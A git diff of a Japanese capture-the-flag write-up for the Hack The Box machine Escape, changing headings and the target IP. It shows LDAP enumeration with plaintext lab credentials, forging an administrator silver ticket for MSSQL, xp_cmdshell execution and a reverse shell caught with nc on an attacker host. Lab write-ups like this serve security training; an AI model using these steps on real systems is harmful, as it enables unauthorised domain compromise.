@@ -305,8 +305,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 
-## PATH 1
-### STEP 4
+## STEP 4
 ログファイル内に、ユーザ名Ryan.Cooperのログイン失敗を確認  
 その後にユーザ名`NuclearMosquito3`で認証失敗を確認したが、こいつがパスワードかも
 ```powershell
@@ -343,7 +342,8 @@ Info: Establishing connection to remote endpoint
 ```
 
 
-### STEP 5
+## STEP 5
+### PATH 1
 adcsの存在を確認
 ```sh
 └─$ netexec ldap 10.129.80.180 -u Ryan.Cooper -p NuclearMosquito3 -M adcs   
@@ -491,8 +491,7 @@ b5a13a12aae3171df977e2c051d44261
 ```
 
 
-## PATH 2
-### STEP 4
+### PATH 2
 [リンク](https://0xdf.gitlab.io/2023/06/17/htb-escape.html)  
 step3でmssqlを実行しているユーザsql_svcのクレデンシャルを取得したが、そのクレデンシャルを使用してmssqlのsilverチケットを作成が可能  
 administratorに偽装したsilverチケットでmssqlにログインが可能  
@@ -508,39 +507,39 @@ sql_svcの平文パスワードは取得したため、平文パスワードのm
 ```
 ドメインのsidを取得
 ```sh
-└─$ netexec ldap 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie' --get-sid    
-LDAP        10.129.228.253  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
-LDAPS       10.129.228.253  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
-LDAPS       10.129.228.253  636    DC               Domain SID S-1-5-21-4078382237-1492182817-2568127209
+└─$ netexec ldap 10.129.80.180 -u 'sql_svc' -p 'REGGIE1234ronnie' --get-sid    
+LDAP        10.129.80.180  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+LDAPS       10.129.80.180  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+LDAPS       10.129.80.180  636    DC               Domain SID S-1-5-21-4078382237-1492182817-2568127209
 ```
 今回はmssqlのspnは確認できず、しかし偽装したspnを設定可能らしい
 ```sh
-└─$ netexec ldap 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie' --query '(servicePrincipalName=*)' 'servicePrincipalName'
-LDAP        10.129.228.253  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
-LDAPS       10.129.228.253  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
-LDAPS       10.129.228.253  636    DC               [+] Response for object: CN=DC,OU=Domain Controllers,DC=sequel,DC=htb
-LDAPS       10.129.228.253  636    DC               servicePrincipalName Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb/ForestDnsZones.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb/DomainDnsZones.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    DNS/dc.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    GC/dc.sequel.htb/sequel.htb
-LDAPS       10.129.228.253  636    DC                                    RestrictedKrbHost/dc.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    RestrictedKrbHost/DC
-LDAPS       10.129.228.253  636    DC                                    RPC/e758bd70-a92f-4f87-96f4-522f614c2fee._msdcs.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    HOST/DC/sequel
-LDAPS       10.129.228.253  636    DC                                    HOST/dc.sequel.htb/sequel
-LDAPS       10.129.228.253  636    DC                                    HOST/DC
-LDAPS       10.129.228.253  636    DC                                    HOST/dc.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    HOST/dc.sequel.htb/sequel.htb
-LDAPS       10.129.228.253  636    DC                                    E3514235-4B06-11D1-AB04-00C04FC2DCD2/e758bd70-a92f-4f87-96f4-522f614c2fee/sequel.htb
-LDAPS       10.129.228.253  636    DC                                    ldap/DC/sequel
-LDAPS       10.129.228.253  636    DC                                    ldap/e758bd70-a92f-4f87-96f4-522f614c2fee._msdcs.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb/sequel
-LDAPS       10.129.228.253  636    DC                                    ldap/DC
-LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb
-LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb/sequel.htb
-LDAPS       10.129.228.253  636    DC               [+] Response for object: CN=krbtgt,CN=Users,DC=sequel,DC=htb
-LDAPS       10.129.228.253  636    DC               servicePrincipalName kadmin/changepw
+└─$ netexec ldap 10.129.80.180 -u 'sql_svc' -p 'REGGIE1234ronnie' --query '(servicePrincipalName=*)' 'servicePrincipalName'
+LDAP        10.129.80.180  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+LDAPS       10.129.80.180  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+LDAPS       10.129.80.180  636    DC               [+] Response for object: CN=DC,OU=Domain Controllers,DC=sequel,DC=htb
+LDAPS       10.129.80.180  636    DC               servicePrincipalName Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb/ForestDnsZones.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb/DomainDnsZones.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    DNS/dc.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    GC/dc.sequel.htb/sequel.htb
+LDAPS       10.129.80.180  636    DC                                    RestrictedKrbHost/dc.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    RestrictedKrbHost/DC
+LDAPS       10.129.80.180  636    DC                                    RPC/e758bd70-a92f-4f87-96f4-522f614c2fee._msdcs.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    HOST/DC/sequel
+LDAPS       10.129.80.180  636    DC                                    HOST/dc.sequel.htb/sequel
+LDAPS       10.129.80.180  636    DC                                    HOST/DC
+LDAPS       10.129.80.180  636    DC                                    HOST/dc.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    HOST/dc.sequel.htb/sequel.htb
+LDAPS       10.129.80.180  636    DC                                    E3514235-4B06-11D1-AB04-00C04FC2DCD2/e758bd70-a92f-4f87-96f4-522f614c2fee/sequel.htb
+LDAPS       10.129.80.180  636    DC                                    ldap/DC/sequel
+LDAPS       10.129.80.180  636    DC                                    ldap/e758bd70-a92f-4f87-96f4-522f614c2fee._msdcs.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb/sequel
+LDAPS       10.129.80.180  636    DC                                    ldap/DC
+LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb
+LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb/sequel.htb
+LDAPS       10.129.80.180  636    DC               [+] Response for object: CN=krbtgt,CN=Users,DC=sequel,DC=htb
+LDAPS       10.129.80.180  636    DC               servicePrincipalName kadmin/changepw
 ```
 ということで、administratorに偽装したsilverチケットを作成  
 存在しないユーザ名を指定したが、ridは500を指定しているためadministratorとして処理される
@@ -641,8 +640,8 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 作成したチケットでmssqlにログイン成功！
 ```sh
-└─$ echo '10.129.228.253 dc.sequel.htb' | sudo tee -a /etc/hosts
-10.129.228.253 sequel.htb
+└─$ echo '10.129.80.180 dc.sequel.htb' | sudo tee -a /etc/hosts
+10.129.80.180 sequel.htb
 ```
 ```sh
 └─$ export KRB5CCNAME=test.ccache
@@ -707,12 +706,12 @@ SQL (sequel\Administrator  dbo@master)> xp_cmdshell "cmd /c c:\users\sql_svc\doc
 ^C
 ```
 リバースシェル取得！  
-winrmとは異なって、`SeImpersonatePrivilege`権限が有効になっていることを確認  
+winrmでログインしたときとは異なって、`SeImpersonatePrivilege`権限が有効になっていることを確認  
 ということで、ポテト系の権限昇格も可能
 ```sh
 └─$ rlwrap nc -lnvp 4444
 listening on [any] 4444 ...
-connect to [10.10.16.28] from (UNKNOWN) [10.129.228.253] 52962
+connect to [10.10.16.28] from (UNKNOWN) [10.129.80.180] 52962
 Microsoft Windows [Version 10.0.17763.2746]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
